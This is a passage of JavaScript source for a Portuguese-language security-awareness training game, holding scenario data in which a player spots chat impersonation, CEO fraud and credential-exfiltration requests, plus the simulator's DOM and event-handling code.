          <p>Descobrimos que uma gangue cibernética conseguiu <strong>roubar cookies de sessão</strong> de alguns colaboradores da nossa empresa e está se passando por eles no chat corporativo!</p>
        `
      },
      {
        step: 2,
        text: `
          <p>Ativamos o <strong>TechZap (WhatsApp Corporativo)</strong> na sua estação de trabalho.</p>
          <p>Colaboradores entrarão em contato direto com você pedindo reset de 2FA, envio de senhas e liberação de VPN.</p>
        `
      },
      {
        step: 3,
        text: `
          <p>Consulte a lista de crachás no <strong>Word (Procedimentos_TI.doc)</strong>!</p>
          <p>Se o contato errar o crachá corporativo ou agir com urgência falsa, <strong>bloqueie a conta na hora</strong>. Você tem margem de até 2 erros para passar!</p>
        `
      }
    ],
    scenarios: [
      {
        id: 's3-1',
        channel: 'zap',
        time: '09:40',
        senderName: 'carlos.dev (Via TechZap)',
        senderEmail: '+55 11 98765-4321',
        avatarChar: 'C',
        avatarColor: '#2e7d32',
        subject: '[CHAT TECHZAP] carlos.dev: "Preciso de reset do meu 2FA urgente!"',
        snippet: 'Troquei de celular agora e perdi o 2FA. Pode desativar pra mim rapidão?...',
        meta: { 'Contato': 'carlos.dev (Sessão Web Nova)', 'Localização IP': 'São Petersburgo, Rússia', 'Data': '09:38', 'Crachá Informado': '#DEV-999' },
        body: `
          <div class="techzap-chat-card">
            <div class="chat-bubble-incoming">
              <strong>carlos.dev:</strong><br>
              "Fala meu bom! Cara, comprei um celular novo no shopping e perdi o aplicativo de 2FA do autenticador. Desativa o 2FA da minha conta aí rapidão que preciso subir um deploy agora em 5 minutos!"
            </div>
            <div class="chat-bubble-challenge">
              <strong>Você (Analista):</strong> "Carlos, para sua segurança, confirme o número do seu crachá e seu projeto principal."<br>
              <strong>carlos.dev:</strong> "Ah pô, crachá é #DEV-999 e o projeto é crypto-worker! Libera logo mano, tô com pressa!"
            </div>
          </div>
        `,
        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP: 185.220.101.9 (Rússia) | Crachá Informado: #DEV-999' },
        actions: [
          { id: 'a1', label: '🔒 Bloquear Conta de carlos.dev & Invalidar Todas as Sessões', correct: true, toastMsg: 'Conta comprometida bloqueada.', logTitle: 'Invasor em Conta de Carlos Neutralizado', consequence: 'Sessão roubada pelo invasor derrubada e conta corporativa protegida.', explanation: 'Excelente investigação! No manual do Word, o crachá real de Carlos é #DEV-042.' },
          { id: 'a2', label: '🔓 Desativar 2FA e Liberar Acesso', correct: false, toastMsg: '2FA desativado.', logTitle: 'Conta Corporativa Entregue a Invasor', consequence: 'A gangue assumiu o controle total da conta de desenvolvedor sênior de Carlos.', explanation: 'O contato era um golpista com IP da Rússia e crachá falso #DEV-999.' }
        ]
      },
      {
        id: 's3-2',
        channel: 'zap',
        time: '11:50',
        senderName: 'beatriz.sec (Via TechZap)',
        senderEmail: '+55 11 97654-3210',
        avatarChar: 'B',
        avatarColor: '#00897b',
        subject: '[CHAT TECHZAP] beatriz.sec: "Confirmação de chave token para forense"',
        snippet: 'Estou conduzindo a investigação #SEC-8921. Segue meu crachá e token...',
        meta: { 'Contato': 'beatriz.sec (SecOps)', 'Localização IP': 'São Paulo, Brasil (VPN TechCore)', 'Data': '11:48', 'Crachá Informado': '#SEC-8921' },
        body: `
          <div class="techzap-chat-card">
            <div class="chat-bubble-incoming">
              <strong>beatriz.sec:</strong><br>
              "Olá Analista, sou a Beatriz de SecOps. Estou investigando a tentativa de brute force na API. Meu crachá é #SEC-8921 e meu projeto é auth-service. Pode validar meu token temporário de auditoria?"
            </div>
            <div class="chat-bubble-challenge">
              <strong>Você (Analista):</strong> "Validação automática de MFA: Código 482-910."<br>
              <strong>beatriz.sec:</strong> "Confirmado! Código 482-910 validado no meu app autenticador."
            </div>
          </div>
        `,
        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP: 177.18.22.5 (SP/Brasil - VPN Interna) | Crachá: #SEC-8921' },
        actions: [
          { id: 'a1', label: '✅ Confirmar Identidade e Validar Sessão', correct: true, toastMsg: 'Identidade de Beatriz validada.', logTitle: 'Colaboradora Legítima Confirmada', consequence: 'Investigação forense de Beatriz continuou sem atrasos.', explanation: 'Beatriz forneceu crachá correto (#SEC-8921), projeto correto e MFA válido.' },
          { id: 'a2', label: '🔒 Bloquear Beatriz por Engano', correct: false, toastMsg: 'Beatriz bloqueada.', logTitle: 'Falso Positivo em Analista de Segurança', consequence: 'A analista de SecOps teve seu acesso cortado durante uma auditoria crítica.', explanation: 'Beatriz cumpriu rigorosamente todos os protocolos de autenticação.' }
        ]
      },
      {
        id: 's3-3',
        channel: 'zap',
        time: '14:20',
        senderName: 'marcos.rh (Via TechZap)',
        senderEmail: '+55 11 96543-2109',
        avatarChar: 'M',
        avatarColor: '#e91e63',
        subject: '[CHAT TECHZAP] marcos.rh: "Me manda a chave privada SSL da empresa"',
        snippet: 'Um auditor está aqui e precisa da chave privada do certificado SSL agora...',
        meta: { 'Contato': 'marcos.rh (Sessão Anômala)', 'Localização IP': 'Bucareste, Romênia', 'Data': '14:18', 'Crachá Informado': 'Não soube responder' },
        body: `
          <div class="techzap-chat-card">
            <div class="chat-bubble-incoming">
              <strong>marcos.rh:</strong><br>
              "Oi colega da TI, estou numa reunião com auditores do Ministério do Trabalho e eles exigiram que você envie o arquivo private_key.pem do certificado SSL da empresa por aqui agora!"
            </div>
            <div class="chat-bubble-challenge">
              <strong>Você (Analista):</strong> "Marcos, o RH nunca lida com chaves SSL. Qual é o seu crachá corporativo?"<br>
              <strong>marcos.rh:</strong> "Não interessa o crachá! Sou gerente e se você não mandar vou te advertir por insubordinação!"
            </div>
          </div>
        `,
        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP: 194.102.23.1 (Romênia) | Solicitação: private_key.pem' },
        actions: [
          { id: 'a1', label: '🔒 Bloquear Conta Imediatamente & Alertar CISO', correct: true, toastMsg: 'Conta fraudulenta bloqueada.', logTitle: 'Tentativa de Roubo de Certificado SSL Barrada', consequence: 'Tentativa de extorsão e roubo de chaves criptográficas abortada.', explanation: 'Perfeito! Chaves SSL nunca devem ser compartilhadas por mensagens de chat.' },
          { id: 'a2', label: '📦 Enviar Arquivo private_key.pem', correct: false, toastMsg: 'Chave enviada.', logTitle: 'Vazamento Crítico de Chaves SSL', consequence: 'A gangue interceptou todo o tráfego HTTPS criptografado da empresa.', explanation: 'Chaves privadas nunca saem do cofre de servidores sob nenhuma hipótese.' }
        ]
      },
      {
        id: 's3-4',
        channel: 'zap',
        time: '16:05',
        senderName: 'alex.intern (Via TechZap)',
        senderEmail: '+55 11 95432-1098',
        avatarChar: 'A',
        avatarColor: '#f57c00',
        subject: '[CHAT TECHZAP] alex.intern: "Dúvida sobre configuração da VPN de dev"',
        snippet: 'Oi, estou com erro 403 no ambiente de staging. Segue meu chamado #STG-331...',
        meta: { 'Contato': 'alex.intern (Estagiário)', 'Localização IP': 'São Paulo, Brasil', 'Data': '16:02', 'Chamado': '#STG-331' },
        body: `
          <div class="techzap-chat-card">
            <div class="chat-bubble-incoming">
              <strong>alex.intern:</strong><br>
              "Oi time de TI, estou tentando rodar os testes do front-end no ambiente de staging e dá erro de certificado. Segue o chamado registrado no portal #STG-331 e meu crachá #INT-007. Podem me orientar?"
            </div>
          </div>
        `,
        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP: 177.18.22.88 (São Paulo) | Crachá: #INT-007 | Chamado: #STG-331' },
        actions: [
          { id: 'a1', label: '📨 Responder com Link da Documentação da Intranet', correct: true, toastMsg: 'Orientação enviada.', logTitle: 'Suporte Interno Prestado', consequence: 'Estagiário configurou o certificado de staging corretamente.', explanation: 'Contato legítimo de suporte que não envolveu vazamento ou quebra de regras.' },
          { id: 'a2', label: '🔒 Bloquear Alex como Suspeito', correct: false, toastMsg: 'Alex bloqueado.', logTitle: 'Bloqueio Indevido de Suporte', consequence: 'Estagiário ficou sem trabalhar por bloqueio incorreto.', explanation: 'Alex forneceu o crachá correto #INT-007 e chamado regular registrado.' }
        ]
      },
      {
        id: 's3-5',
        channel: 'zap',
        time: '17:30',
        senderName: 'Diretoria Presidência (Via TechZap)',
        senderEmail: '+1 (555) 019-2831',
        avatarChar: 'D',
        avatarColor: '#424242',
        subject: '[CHAT TECHZAP] "Urgente: Libere o acesso SSH para a nova consultoria"',
        snippet: 'Aqui é o Rogério de outro celular em viagem internacional. Libere o IP 198.51.100.22...',
        meta: { 'Número': '+1 555 019-2831 (EUA / VOIP)', 'Data': '17:28', 'Status': 'Número VOIP Desconhecido' },
        body: `
          <div class="techzap-chat-card">
            <div class="chat-bubble-incoming">
              <strong>Desconhecido (Foto do Rogério):</strong><br>
              "Aqui é o Rogério CEO. Estou em Nova York fechando um contrato de aquisição. Preciso que você libere agora o IP 198.51.100.22 no firewall SSH. Não fale com ninguém sobre isso."
            </div>
          </div>
        `,
        inspector: { type: 'url', label: 'Auditoria de Número de Telefone', dest: 'Telefone: +1 (555) 019-2831 (VOIP Não Registrado) | Ação: Liberação de Porta 22 SSH' },
        actions: [
          { id: 'a1', label: '🚨 Denunciar Número & Bloquear no Gateway', correct: true, toastMsg: 'Número falso bloqueado.', logTitle: 'Fraude do CEO no WhatsApp Neutralizada', consequence: 'Tentativa de manipulação executiva abortada e registrada no relatório.', explanation: 'Excelente! O CEO Rogério usa exclusivamente os canais oficiais internos.' },
          { id: 'a2', label: '🔓 Abrir Porta SSH no Firewall', correct: false, toastMsg: 'Porta liberada.', logTitle: 'Porta SSH Exposta a Invasores', consequence: 'Os criminosos invadiram o gateway central através da porta liberada.', explanation: 'Fraude do CEO por número VOIP desconhecido violando as políticas.' }
        ]
      }
    ]
  },

  // ----------------------------------------------------
  // TURNO 4: Contrainteligência & Envio de Arquivos (TechVault)
  // ----------------------------------------------------
  {
    shiftNumber: 4,
    title: 'Turno 4: Contrainteligência & Envio de Arquivos',
    brandName: 'TechVault',
    brandIcon: '📦',
    url: 'https://vault-dispatch.techcore.internal/ops/#honeytokens',
    wordContent: `
      <h2>1. PROTOCOLO DE DESPACHO SEGURO (TECHVAULT)</h2>
      <p>Na fase final de contrainteligência, apenas os seguintes arquivos e destinos são autorizados pelo CEO Rogério Silva:</p>
      <ul>
        <li><code>honeytoken_trap_v4.vault</code> -> Destino Oficial: <code>dropzone-trap@techcore-vault.internal</code> (Isca C2).</li>
        <li><code>hotfix_auth_patch.enc</code> -> Destino Oficial: <code>deploy-cluster@techcore-vault.internal</code> (Cluster de Produção).</li>
        <li><code>ciso_master_report.sig</code> -> Destino Oficial: <code>board-vault@techcore-vault.internal</code> (Conselho de Administração).</li>
      </ul>

      <h2>2. REJEIÇÃO DE EXFILTRAÇÃO EXTERNA</h2>
      <p>Qualquer solicitação de envio de arquivos sensíveis verdadeiros (como <code>aws_credentials.json</code>, senhas ou relatórios preliminares) para domínios públicos ou de imprensa deve ser <strong>terminantemente rejeitada</strong>.</p>
    `,
    ceoDialogues: [
      {
        step: 1,
        text: `
          <p>Chegamos ao turno decisivo da nossa campanha, Analista! O <strong>Turno 4</strong> é a nossa contraofensiva.</p>
          <p>Com as evidências que você coletou nos turnos anteriores, vamos armar uma <strong>emboscada digital (Honeytokens)</strong> para capturar os criminosos de vez.</p>
        `
      },
      {
        step: 2,
        text: `
          <p>Ativei o <strong>TechVault (Despachador Seguro de Arquivos)</strong>.</p>
          <p>Eu mandei uma lista de arquivos específicos e criptografados que você deve enviar para os servidores de armadilha e cofres oficiais.</p>
        `
      },
      {
        step: 3,
        text: `
          <p>Consulte os nomes exatos dos arquivos no <strong>Word (Procedimentos_TI.doc)</strong>!</p>
          <p>Envie apenas os arquivos autorizados e rejeite armadilhas externas. No máximo 2 erros para finalizar com louvor!</p>
        `
      }
    ],
    scenarios: [
      {
        id: 's4-1',
        channel: 'vault',
        time: '09:15',
        senderName: 'CEO Rogério Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[ORDEM DIRETA] Despachar Arquivo Honeytoken: honeytoken_trap_v4.vault',
        snippet: 'Despache a armadilha com tokens falsos para o dropzone oficial da perícia...',
        meta: { 'Arquivo': 'honeytoken_trap_v4.vault (Hash: 9a8f...bc)', 'Destino': 'dropzone-trap@techcore-vault.internal', 'Data': '09:12', 'Prioridade': 'MÁXIMA (CEO)' },
        body: `<p>Instrução Direta do CEO Rogério:</p><div class="email-quote-box"><p>"Analista, envie agora o arquivo <code>honeytoken_trap_v4.vault</code> para o endereço de armadilha oficial <code>dropzone-trap@techcore-vault.internal</code> para rastrearmos a origem do grupo hacker."</p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Despacho de Arquivo', dest: 'Arquivo: honeytoken_trap_v4.vault -> Destino: dropzone-trap@techcore-vault.internal' },
        actions: [
          { id: 'a1', label: '🚀 Despachar honeytoken_trap_v4.vault para o Cofre Oficial', correct: true, toastMsg: 'Honeytoken despachado com sucesso.', logTitle: 'Armadilha Honeytoken Ativada', consequence: 'O grupo hacker mordeu a isca e seus endereços IP foram triangulados pela polícia.', explanation: 'Ordem oficial do CEO Rogério cumprida com precisão de acordo com o Word.' },
          { id: 'a2', label: '🚫 Cancelar Envio', correct: false, toastMsg: 'Envio cancelado.', logTitle: 'Operação de Contrainteligência Abortada', consequence: 'A emboscada falhou e a gangue conseguiu escapar sem ser rastreada.', explanation: 'O arquivo foi solicitado expressamente pelo CEO Rogério.' }
        ]
      },
      {
        id: 's4-2',
        channel: 'vault',
        time: '11:40',
        senderName: 'Suporte Falso da AWS',
        senderEmail: 'security-audit@aws-cloud-verify.net',
        avatarChar: 'A',
        avatarColor: '#d93025',
        subject: '[URGENTE/AWS] Envio Obrigatório do Arquivo aws_credentials.json',
        snippet: 'Detectamos inconformidade na sua conta AWS. Envie o arquivo de credenciais para auditoria...',
        meta: { 'Arquivo Solicitado': 'aws_credentials.json (CHAVES REAIS)', 'Destino': 'exfil-bucket@aws-cloud-verify.net', 'Data': '11:38', 'Segurança': 'Domínio Falso' },
        body: `<p>Notificação Externa:</p><div class="email-quote-box"><p>"Sua conta AWS sofrerá desligamento em 1 hora a menos que você envie o arquivo <code>aws_credentials.json</code> para o bucket de validação."</p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Destino de Arquivo', dest: 'Arquivo: aws_credentials.json -> Destino: exfil-bucket@aws-cloud-verify.net' },
        actions: [
          { id: 'a1', label: '🚫 Rejeitar Envio, Denunciar e Bloquear Domínio', correct: true, toastMsg: 'Tentativa de roubo bloqueada.', logTitle: 'Interceptação de Chaves AWS Evitada', consequence: 'Chaves mestras da nuvem protegidas contra extração criminosa.', explanation: 'A AWS real nunca pede envio de arquivos de credenciais por e-mail.' },
          { id: 'a2', label: '📦 Enviar aws_credentials.json', correct: false, toastMsg: 'Chaves enviadas.', logTitle: 'Vazamento Total da Infraestrutura AWS', consequence: 'Os invasores assumiram o controle de todos os servidores da nuvem.', explanation: 'Nunca envie credenciais e segredos corporativos para remetentes externos.' }
        ]
      },
      {
        id: 's4-3',
        channel: 'vault',
        time: '14:15',
        senderName: 'CEO Rogério Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[DEPLOY EMERGENCIAL] Despacho do Pacote: hotfix_auth_patch.enc',
        snippet: 'Enviar hotfix criptografado de correção de vulnerabilidade para o cluster de deploy...',
        meta: { 'Arquivo': 'hotfix_auth_patch.enc', 'Destino': 'deploy-cluster@techcore-vault.internal', 'Data': '14:12', 'Status': 'Assinado' },
        body: `<p>Instrução de Deploy Seguro:</p><div class="email-quote-box"><p>"Despache o pacote <code>hotfix_auth_patch.enc</code> para o cluster de deploy <code>deploy-cluster@techcore-vault.internal</code> para aplicar o patch que bloqueia o backdoor."</p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Pacote de Patch', dest: 'Arquivo: hotfix_auth_patch.enc -> Destino: deploy-cluster@techcore-vault.internal' },
        actions: [
          { id: 'a1', label: '🚀 Despachar hotfix_auth_patch.enc para Deploy', correct: true, toastMsg: 'Patch despachado e aplicado.', logTitle: 'Patch de Segurança Aplicado em Produção', consequence: 'Vulnerabilidades corrigidas em todos os servidores da TechCore.', explanation: 'Envio do arquivo correto para o destino interno seguro conforme manual do Word.' },
          { id: 'a2', label: '🚫 Rejeitar Despacho do Patch', correct: false, toastMsg: 'Patch não enviado.', logTitle: 'Atraso em Correção Crítica', consequence: 'Servidores continuaram vulneráveis por falta de aplicação do hotfix.', explanation: 'O pacote de correção foi requisitado pelo CEO com assinatura válida.' }
        ]
      },
      {
        id: 's4-4',
        channel: 'vault',
        time: '16:00',
        senderName: 'Portal de Jornalismo TechLeaks',
        senderEmail: 'redacao@techleaks-news.com',
        avatarChar: 'T',
        avatarColor: '#9333ea',
        subject: '[IMPRENSA] Solicitação de Cópia do Relatório Forense Interno',
        snippet: 'Recebemos relatos de invasão na TechCore. Envie uma cópia do relatório antes da publicação...',
        meta: { 'Arquivo Solicitado': 'ciso_master_report.sig (CONFIDENCIAL)', 'Destino': 'vazamentos@techleaks-news.com', 'Data': '15:58', 'Status': 'Não Autorizado' },
        body: `<p>Tentativa Externa de Obtenção de Dados:</p><div class="email-quote-box"><p>"Gostaríamos que vocês enviassem o relatório forense antes que nossa equipe publique a matéria sobre a invasão."</p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Destino de Arquivo', dest: 'Arquivo: ciso_master_report.sig -> Destino: vazamentos@techleaks-news.com' },
        actions: [
          { id: 'a1', label: '🛡️ Rejeitar Envio e Encaminhar para Assessoria Jurídica', correct: true, toastMsg: 'Informação sigilosa preservada.', logTitle: 'Vazamento para Imprensa Evitado', consequence: 'Sigilo de mercado preservado de acordo com a política corporativa.', explanation: 'Arquivos forenses e de segurança jamais são compartilhados com entidades externas.' },
          { id: 'a2', label: '📦 Enviar Relatório Forense', correct: false, toastMsg: 'Arquivo enviado.', logTitle: 'Vazamento de Segredo Corporativo', consequence: 'A empresa sofreu queda na bolsa de valores por vazamento indevido.', explanation: 'Violação grave de NDA e política de segurança da informação.' }
        ]
      },
      {
        id: 's4-5',
        channel: 'vault',
        time: '17:45',
        senderName: 'CEO Rogério Silva (Oficial)',
        senderEmail: 'rogerio.ceo@techcore.com',
        avatarChar: 'R',
        avatarColor: '#0055ea',
        subject: '[FINAL DE EXPEDIENTE] Envio do Relatório Final: ciso_master_report.sig',
        snippet: 'Encaminhe o pacote final de auditoria para o cofre seguro da Diretoria Executiva...',
        meta: { 'Arquivo': 'ciso_master_report.sig', 'Destino': 'board-vault@techcore-vault.internal', 'Data': '17:42', 'Prioridade': 'CONCLUSAO DE OPERAÇÃO' },
        body: `<p>Última Ação do Turno 4:</p><div class="email-quote-box"><p>"Analista, despache o relatório <code>ciso_master_report.sig</code> para <code>board-vault@techcore-vault.internal</code> para finalizarmos a auditoria oficial e apresentarmos ao Conselho de Administração!"</p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Despacho Final', dest: 'Arquivo: ciso_master_report.sig -> Destino: board-vault@techcore-vault.internal' },
        actions: [
          { id: 'a1', label: '🚀 Despachar ciso_master_report.sig para a Diretoria', correct: true, toastMsg: 'Relatório final entregue à Diretoria.', logTitle: 'Auditoria Concluída com Sucesso', consequence: 'Relatório master entregue ao conselho e campanha finalizada com louvor!', explanation: 'Perfeita conclusão da campanha dos 4 turnos da TechCore.' },
          { id: 'a2', label: '🚫 Rejeitar Despacho', correct: false, toastMsg: 'Despacho rejeitado.', logTitle: 'Atraso na Entrega da Auditoria', consequence: 'A reunião do conselho de administração não recebeu o relatório final.', explanation: 'O relatório final oficial foi solicitado expressamente pelo CEO.' }
        ]
      }
    ]
  }
];

// ==========================================
// MAIN SIMULATOR CONTROLLER
// ==========================================
class TechMailSimulator {
  constructor() {
    this.currentShiftIndex = 0;
    this.currentDialogIndex = 0;
    this.processedItems = [];
    this.decisionsHistory = [];
    this.campaignHistory = [];
    this.currentCategoryFilter = 'all';
    this.currentAppView = 'mail'; // 'mail' or 'word'

    this.cacheDOMElements();
    this.bindEvents();
  }

  cacheDOMElements() {
    this.startScreen = document.getElementById('start-screen');
    this.exitScreen = document.getElementById('exit-screen');
    this.ceoDialogModal = document.getElementById('ceo-dialog-modal');
    this.mainWorkspace = document.getElementById('main-workspace');

    this.btnStartShift = document.getElementById('btn-start-shift');
    this.btnExitSite = document.getElementById('btn-exit-site');
    this.btnReopenSite = document.getElementById('btn-reopen-site');

    // Dialogue elements
    this.ceoDialogTitlebar = document.getElementById('ceo-dialog-titlebar');
    this.ceoDialogSpeakerTag = document.getElementById('ceo-dialog-speaker-tag');
    this.ceoSpeechText = document.getElementById('ceo-speech-text');
    this.dialogStepIndicator = document.getElementById('dialog-step-indicator');
    this.btnDialogPrev = document.getElementById('btn-dialog-prev');
    this.btnDialogNext = document.getElementById('btn-dialog-next');
    this.btnStartWorkstationFromDialog = document.getElementById('btn-start-workstation-from-dialog');
    this.btnSkipDialog = document.getElementById('btn-skip-dialog');

    // Views & Tabs
    this.tabBtnMailview = document.getElementById('tab-btn-mailview');
    this.tabBtnWordview = document.getElementById('tab-btn-wordview');
    this.btnOpenWordTab = document.getElementById('btn-open-word-tab');
    this.appWorkspaceBody = document.getElementById('app-workspace-body');
    this.wordDocView = document.getElementById('word-doc-view');
    this.wordDocContent = document.getElementById('word-doc-content');

    // Headers & URL
    this.shiftPillBadge = document.getElementById('shift-pill-badge');
    this.browserTabIcon = document.getElementById('browser-tab-icon');
    this.browserTabTitle = document.getElementById('browser-tab-title');
    this.browserUrlBar = document.getElementById('browser-url-bar');
    this.appBrandIcon = document.getElementById('app-brand-icon');
    this.appBrandName = document.getElementById('app-brand-name');
    this.shiftClock = document.getElementById('shift-clock');
    this.taskbarClock = document.getElementById('taskbar-clock');
    this.taskbarActiveTitle = document.getElementById('taskbar-active-title');
    this.btnSoundToggle = document.getElementById('btn-sound-toggle');
    this.btnWinExit = document.getElementById('btn-win-exit');

    // Desktop icons
    this.diconMail = document.getElementById('dicon-mail');
    this.diconGithub = document.getElementById('dicon-github');
    this.diconIam = document.getElementById('dicon-iam');
    this.diconDb = document.getElementById('dicon-db');
    this.diconZap = document.getElementById('dicon-zap');
    this.diconVault = document.getElementById('dicon-vault');
    this.diconWord = document.getElementById('dicon-word');

    // Sidebar folder rows
    this.folderDbRow = document.getElementById('folder-db-row');
    this.folderZapRow = document.getElementById('folder-zap-row');
    this.folderVaultRow = document.getElementById('folder-vault-row');

    // Tabs in mail header
    this.tabBtnDb = document.getElementById('tab-btn-db');
    this.tabBtnZap = document.getElementById('tab-btn-zap');
    this.tabBtnVault = document.getElementById('tab-btn-vault');
    this.tabDbTag = document.getElementById('tab-db-tag');
    this.tabZapTag = document.getElementById('tab-zap-tag');
    this.tabVaultTag = document.getElementById('tab-vault-tag');

    // Views
    this.inboxListView = document.getElementById('inbox-list-view');
    this.emailItemsContainer = document.getElementById('email-items-container');
    this.emailReaderView = document.getElementById('email-reader-view');
    this.auditReportView = document.getElementById('audit-report-view');
    this.btnBackToInbox = document.getElementById('btn-back-to-inbox');
    this.browserBackBtn = document.getElementById('browser-back-btn');
    this.browserRefreshBtn = document.getElementById('browser-refresh-btn');

    // Badges
    this.badgeEmailCount = document.getElementById('badge-email-count');
    this.badgeGithubCount = document.getElementById('badge-github-count');
    this.badgeIamCount = document.getElementById('badge-iam-count');
    this.badgeDbCount = document.getElementById('badge-db-count');
    this.badgeZapCount = document.getElementById('badge-zap-count');
    this.badgeVaultCount = document.getElementById('badge-vault-count');
    this.badgeDoneCount = document.getElementById('badge-done-count');
    this.tabEmailTag = document.getElementById('tab-email-tag');
    this.tabGithubTag = document.getElementById('tab-github-tag');
    this.tabIamTag = document.getElementById('tab-iam-tag');

    // Reader elements
    this.readerTypeTag = document.getElementById('reader-type-tag');
    this.readerTimeMeta = document.getElementById('reader-time-meta');
    this.readerSubjectTitle = document.getElementById('reader-subject-title');
    this.readerSenderAvatar = document.getElementById('reader-sender-avatar');
    this.readerSenderName = document.getElementById('reader-sender-name');
    this.readerSenderEmail = document.getElementById('reader-sender-email');
    this.readerReceivedTime = document.getElementById('reader-received-time');
    this.btnToggleHeaders = document.getElementById('btn-toggle-headers');
    this.technicalHeadersBox = document.getElementById('technical-headers-box');
    this.headerDe = document.getElementById('header-de');
    this.headerPara = document.getElementById('header-para');
    this.headerData = document.getElementById('header-data');
    this.headerAuth = document.getElementById('header-auth');
    this.readerBodyMessage = document.getElementById('reader-body-message');
    this.readerInspectorSection = document.getElementById('reader-inspector-section');
    this.decisionButtonsGroup = document.getElementById('decision-buttons-group');

    // Toast
    this.actionToast = document.getElementById('action-toast');
    this.toastMsg = document.getElementById('toast-msg');

    // Audit Report Elements
    this.reportThreatsAvoided = document.getElementById('report-threats-avoided');
    this.reportThreatsTaken = document.getElementById('report-threats-taken');
    this.reportHealthFinal = document.getElementById('report-health-final');
    this.reportReputationFinal = document.getElementById('report-reputation-final');
    this.auditStamp = document.getElementById('audit-stamp');
    this.auditTitle = document.getElementById('audit-title');
    this.auditSubText = document.getElementById('audit-sub-text');
    this.auditVerdictTitle = document.getElementById('audit-verdict-title');
    this.auditVerdictText = document.getElementById('audit-verdict-text');
    this.auditTableBody = document.getElementById('audit-table-body');
    this.btnNextShiftAction = document.getElementById('btn-next-shift-action');
    this.btnRestartShift = document.getElementById('btn-restart-shift');
  }

  getCurrentShift() {
    return CAMPAIGN_SHIFTS[this.currentShiftIndex] || CAMPAIGN_SHIFTS[0];
  }

  bindEvents() {
    // 1. Start Shift -> Turno 1
    this.btnStartShift.addEventListener('click', () => {
      audio.click();
      this.currentShiftIndex = 0;
      this.campaignHistory = [];
      this.openCeoDialogueForShift(0);
    });
    this.btnStartShift.addEventListener('mouseenter', () => audio.menuHover());

    // 2. Exit screen
    this.btnExitSite.addEventListener('click', () => {
      audio.click();
      this.startScreen.style.display = 'none';
      this.exitScreen.style.display = 'flex';
    });
    this.btnExitSite.addEventListener('mouseenter', () => audio.menuHover());

    this.btnWinExit.addEventListener('click', () => {
      audio.click();
      this.mainWorkspace.style.display = 'none';
      this.startScreen.style.display = 'flex';
    });

    this.btnReopenSite.addEventListener('click', () => {
      audio.click();
      this.exitScreen.style.display = 'none';
      this.startScreen.style.display = 'flex';
    });

    // 3. Tab Switching between Mail & Word 2000
    this.tabBtnMailview.addEventListener('click', () => {
      audio.click();
      this.switchToAppView('mail');
    });

    this.tabBtnWordview.addEventListener('click', () => {
      audio.click();
      this.switchToAppView('word');
    });

    this.btnOpenWordTab.addEventListener('click', () => {
      audio.click();
      this.switchToAppView('word');
    });

    this.diconWord.addEventListener('click', () => {
      audio.click();
      this.switchToAppView('word');
    });

    // 4. Dialogue navigation
    this.btnDialogNext.addEventListener('click', () => {
      audio.speechAdvance();
      const shift = this.getCurrentShift();
      if (this.currentDialogIndex < shift.ceoDialogues.length - 1) {
        this.currentDialogIndex++;
        this.renderDialogueStep();
      }
    });

    this.btnDialogPrev.addEventListener('click', () => {
      audio.speechAdvance();
      if (this.currentDialogIndex > 0) {
        this.currentDialogIndex--;
        this.renderDialogueStep();
      }
    });

    this.btnStartWorkstationFromDialog.addEventListener('click', () => {
      audio.click();
      this.ceoDialogModal.style.display = 'none';
      this.startShiftExecution();
    });

    this.btnSkipDialog.addEventListener('click', () => {
      audio.click();
      this.ceoDialogModal.style.display = 'none';
      this.startShiftExecution();
    });

    this.btnSoundToggle.addEventListener('click', () => {
      audio.enabled = !audio.enabled;
      this.btnSoundToggle.textContent = audio.enabled ? '🔊' : '🔇';
      if (audio.enabled) audio.click();
    });

    // Desktop icons filtering
    this.diconMail.addEventListener('click', () => { audio.click(); this.switchToAppView('mail'); this.setCategoryView('email'); });
    this.diconGithub.addEventListener('click', () => { audio.click(); this.switchToAppView('mail'); this.setCategoryView('github'); });
    this.diconIam.addEventListener('click', () => { audio.click(); this.switchToAppView('mail'); this.setCategoryView('iam'); });
    this.diconDb.addEventListener('click', () => { audio.click(); this.switchToAppView('mail'); this.setCategoryView('db'); });
    this.diconZap.addEventListener('click', () => { audio.click(); this.switchToAppView('mail'); this.setCategoryView('zap'); });
    this.diconVault.addEventListener('click', () => { audio.click(); this.switchToAppView('mail'); this.setCategoryView('vault'); });

    // Reader back
    this.btnBackToInbox.addEventListener('click', () => { audio.click(); this.showInboxList(); });
    this.browserBackBtn.addEventListener('click', () => { audio.click(); this.showInboxList(); });
    this.browserRefreshBtn.addEventListener('click', () => {
      audio.click();
      this.renderInboxRows();
      this.showToast('Fila operacional atualizada.');
    });

    this.btnToggleHeaders.addEventListener('click', () => {
      audio.click();
      const isHidden = this.technicalHeadersBox.style.display === 'none';
      this.technicalHeadersBox.style.display = isHidden ? 'flex' : 'none';
      this.btnToggleHeaders.textContent = isHidden ? 'Ocultar Detalhes ▴' : 'Detalhes de Segurança ▾';
    });

    // Tabs in Mail Category
    document.querySelectorAll('.gmail-tabs-header .cat-tab-btn').forEach(tab => {
      tab.addEventListener('click', (e) => {
        audio.click();
        const cat = e.currentTarget.getAttribute('data-cat');
        this.setCategoryView(cat);
      });
    });

    // Sidebar navigation
    document.querySelectorAll('.sidebar-folder-list .folder-row').forEach(item => {
      item.addEventListener('click', (e) => {
        audio.click();
        const view = e.currentTarget.getAttribute('data-view');
        this.setCategoryView(view);
      });
    });

    // Next Shift Action
    this.btnNextShiftAction.addEventListener('click', () => {
      audio.click();
      if (this.currentShiftIndex < CAMPAIGN_SHIFTS.length - 1) {
        this.currentShiftIndex++;
        this.auditReportView.style.display = 'none';
        this.openCeoDialogueForShift(this.currentShiftIndex);
      } else {
        this.currentShiftIndex = 0;
        this.campaignHistory = [];
        this.auditReportView.style.display = 'none';
        this.startScreen.style.display = 'flex';
